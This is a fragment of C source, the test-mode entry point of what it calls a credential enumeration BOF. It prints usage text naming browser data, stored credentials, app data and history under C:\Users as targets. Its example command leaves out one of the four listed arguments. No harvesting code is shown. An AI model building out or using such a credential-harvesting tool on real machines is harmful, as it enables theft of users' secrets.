#include <stdio.h>

int main(int argc, char** argv) {
    printf("Credential Enumeration BOF - Test Mode\n");
    printf("Compile with -DBOF for BOF mode\n");
    printf("Usage: enum-creds.exe <search_path> <group_flags> <sub_flags> <dump_max_bytes>\n");
    printf("  Group flags: APPDATA=0x01, BROWSER=0x02, CREDS=0x04, HISTORY=0x08, ALL=0xFF\n");
    printf("  dump_max_bytes: 0 = no content dump\n");
    printf("Example: enum-creds.exe C:\\\\Users 0xFF 0xFF\n");
    return 0;
}
#endif
